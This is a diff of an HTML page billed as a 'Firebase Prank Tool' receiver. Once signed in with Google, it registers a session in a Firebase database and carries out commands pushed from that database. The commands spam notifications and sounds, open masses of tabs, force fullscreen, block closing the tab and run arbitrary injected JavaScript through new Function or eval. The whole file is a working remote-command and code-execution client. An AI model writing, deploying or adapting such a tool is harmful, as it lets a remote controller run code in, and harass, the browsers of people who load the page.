@@ -1,16 +1,79 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" >
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Notifier - Remote Control Receiver</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Notifier Tab - Firebase Prank Tool</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: #111;
+      color: #eee;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 2rem;
+      text-align: center;
+    }
+    #status {
+      font-weight: 600;
+      font-size: 1.4rem;
+      margin-bottom: 1rem;
+      color: #03dac6;
+    }
+    #sessionId {
+      font-size: 1.1rem;
+      margin-bottom: 2rem;
+      color: #bbb;
+    }
+    button {
+      padding: 0.8rem 1.4rem;
+      font-size: 1rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      background: #2962ff;
+      color: #fff;
+      cursor: pointer;
+      box-shadow: 0 3px 8px rgba(41,98,255,0.7);
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #448aff;
+    }
+    #logoutBtn {
+      position: fixed;
+      top: 12px;
+      right: 12px;
+      background: #bb0000;
+      color: white;
+      border: none;
+      padding: 0.5rem 1rem;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: 600;
+      box-shadow: 0 2px 8px rgba(187,0,0,0.7);
+      z-index: 1000;
+    }
+  </style>
 </head>
 <body>
-<h1>Notifier Tab - Listening for commands</h1>
+
+<div id="status">Not signed in</div>
+<div id="sessionId"></div>
+<button id="loginBtn">Sign in with Google</button>
+<button id="logoutBtn" style="display:none;">Logout</button>
+
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 
 <script>
+  // Firebase config - same as controller
   const firebaseConfig = {
     apiKey: "AIzaSyDSpv4ci1qJo3Oi5WA4gj1pxrBXjxaYYao",
     authDomain: "notify-78da1.firebaseapp.com",
@@ -20,76 +83,191 @@
     messagingSenderId: "936289141781",
     appId: "1:936289141781:web:065ef577df0aa61f40fa1c"
   };
-
   firebase.initializeApp(firebaseConfig);
+  const auth = firebase.auth();
   const db = firebase.database();
 
-  // Request notification permission on load
-  if (Notification.permission !== "granted") {
-    Notification.requestPermission();
+  const statusDiv = document.getElementById('status');
+  const sessionIdDiv = document.getElementById('sessionId');
+  const loginBtn = document.getElementById('loginBtn');
+  const logoutBtn = document.getElementById('logoutBtn');
+
+  let userEmail = null;
+  let sessionKey = null;
+
+  // Keep track of opened tabs for massTab auto-close
+  const openedTabs = new Set();
+
+  function updateStatus(text, color = '#03dac6') {
+    statusDiv.textContent = text;
+    statusDiv.style.color = color;
   }
 
-  // Track tabs opened for auto-close
-  const openedTabs = [];
+  // Ask for notification permission if needed
+  async function requestNotificationPermission() {
+    if (Notification.permission === "default") {
+      try {
+        const perm = await Notification.requestPermission();
+        return perm === "granted";
+      } catch {
+        return false;
+      }
+    }
+    return Notification.permission === "granted";
+  }
 
-  // Listen for new commands added in Firebase
-  const commandsRef = db.ref('commands');
-  commandsRef.on('child_added', async snapshot => {
-    const cmd = snapshot.val();
-    if (!cmd || cmd.delivered) return;
+  function playSound(name) {
+    if (!name) return;
+    const sounds = {
+      default: new Audio('https://actions.google.com/sounds/v1/cartoon/cartoon_boing.ogg'),
+      ding: new Audio('https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg'),
+      alert: new Audio('https://actions.google.com/sounds/v1/alarms/beep_short.ogg')
+    };
+    if (sounds[name]) {
+      sounds[name].play().catch(() => {});
+    }
+  }
 
-    // Mark command as delivered
-    snapshot.ref.update({ delivered: true });
+  // Show notification with options and repeat
+  async function showNotification({title, message, sound, repeat, delay}) {
+    const canNotify = await requestNotificationPermission();
+    if (!canNotify) {
+      updateStatus('Notification permission denied', '#bb0000');
+      return;
+    }
 
-    switch (cmd.type) {
-      case 'notification':
-        for(let i=0; i < (cmd.repeat || 1); i++) {
-          setTimeout(() => {
-            new Notification(cmd.title, {
-              body: cmd.message,
-              silent: cmd.sound === '' ? true : false
-            });
-          }, (cmd.scheduleDelay || 0) + i * 1000);
-        }
-        break;
+    for(let i=0; i < repeat; i++) {
+      new Notification(title, {body: message});
+      playSound(sound);
+      if (i < repeat - 1) {
+        await new Promise(r => setTimeout(r, delay));
+      }
+    }
+  }
 
-      case 'massTabOpen':
-        for(let i = 0; i < cmd.count; i++) {
-          setTimeout(() => {
-            const newTab = window.open(cmd.url, '_blank');
-            if (cmd.autoClose) {
-              setTimeout(() => newTab.close(), cmd.autoCloseTime * 1000);
-            }
-            openedTabs.push(newTab);
-          }, i * cmd.delay);
-        }
-        break;
+  // Handle mass tab open command
+  async function openMassTabs({url, count, delay, autoClose, autoCloseTime}) {
+    updateStatus(`Opening ${count} tabs...`);
+    for(let i=0; i < count; i++) {
+      const newTab = window.open(url, '_blank');
+      if (newTab) {
+        openedTabs.add(newTab);
+      }
+      await new Promise(r => setTimeout(r, delay));
+    }
+    if (autoClose) {
+      setTimeout(() => {
+        openedTabs.forEach(tab => {
+          try { tab.close(); } catch {}
+        });
+        openedTabs.clear();
+        updateStatus(`Closed all opened tabs.`);
+      }, autoCloseTime * 1000);
+    }
+  }
 
-      case 'advanced':
-        if (cmd.forceFullscreen) {
-          if (document.fullscreenElement == null) {
-            document.documentElement.requestFullscreen().catch(() => {});
-          }
+  // Advanced commands execution
+  function executeAdvanced({fullscreen, disableClose, mute, unmute, injectJS}) {
+    if (fullscreen) {
+      if (document.fullscreenEnabled) {
+        document.documentElement.requestFullscreen().catch(() => {});
+      }
+    }
+    if (disableClose) {
+      window.onbeforeunload = () => 'You cannot close this tab!';
+    } else {
+      window.onbeforeunload = null;
+    }
+    if (mute) {
+      document.querySelectorAll('video,audio').forEach(el => el.muted = true);
+    }
+    if (unmute) {
+      document.querySelectorAll('video,audio').forEach(el => el.muted = false);
+    }
+    if (injectJS) {
+      try {
+        // Eval injected JS with try catch
+        new Function(injectJS)();
+      } catch (e) {
+        console.error('Injected JS error:', e);
+      }
+    }
+  }
+
+  // Listen to commands from Firebase
+  function listenCommands(sessionKey, userEmail) {
+    db.ref('commands').on('child_added', snapshot => {
+      const cmd = snapshot.val();
+      const cmdKey = snapshot.key;
+
+      // Check if command targets this session or is broadcast (empty targets)
+      if (!cmd.targets || cmd.targets.length === 0 || cmd.targets.includes(sessionKey)) {
+        // Execute command based on type
+        switch(cmd.type) {
+          case 'notification':
+            showNotification(cmd);
+            break;
+          case 'massTab':
+            openMassTabs(cmd);
+            break;
+          case 'advanced':
+            executeAdvanced(cmd);
+            break;
         }
-        if (cmd.disableClose) {
-          window.onbeforeunload = () => "You can't close this tab!";
+      }
+    });
+  }
+
+  // Update session heartbeat
+  function updateSessionHeartbeat(sessionKey, userEmail) {
+    db.ref('sessions/' + sessionKey).set({
+      email: userEmail,
+      lastSeen: Date.now(),
+    });
+  }
+
+  loginBtn.onclick = () => {
+    const provider = new firebase.auth.GoogleAuthProvider();
+    auth.signInWithPopup(provider)
+      .then(result => {
+        const email = result.user.email;
+        if (!email.endsWith('@gmail.com')) {
+          alert('Only Gmail accounts allowed!');
+          auth.signOut();
+          return;
         }
-        if (cmd.muteAudio) {
-          document.querySelectorAll('video,audio').forEach(media => media.muted = true);
-        }
-        if (cmd.unmuteAudio) {
-          document.querySelectorAll('video,audio').forEach(media => media.muted = false);
-        }
-        if (cmd.injectJS) {
-          try {
-            eval(cmd.injectJS);
-          } catch(e) {
-            console.error("Error in injected JS:", e);
-          }
-        }
-        break;
+      })
+      .catch(err => alert('Login failed: ' + err.message));
+  };
+
+  logoutBtn.onclick = () => {
+    auth.signOut();
+  };
+
+  auth.onAuthStateChanged(user => {
+    if (user) {
+      userEmail = user.email;
+      sessionKey = userEmail.replace(/[^\w]/g, '_') + '_' + Math.floor(Math.random() * 10000);
+      sessionIdDiv.textContent = 'Session: ' + sessionKey;
+      updateStatus('Signed in as ' + userEmail);
+      loginBtn.style.display = 'none';
+      logoutBtn.style.display = 'inline-block';
+
+      updateSessionHeartbeat(sessionKey, userEmail);
+      listenCommands(sessionKey, userEmail);
+
+      // Heartbeat every 30 seconds
+      setInterval(() => updateSessionHeartbeat(sessionKey, userEmail), 30000);
+    } else {
+      userEmail = null;
+      sessionKey = null;
+      sessionIdDiv.textContent = '';
+      updateStatus('Not signed in', '#bbb');
+      loginBtn.style.display = 'inline-block';
+      logoutBtn.style.display = 'none';
     }
   });
 </script>
+
 </body>
 </html>
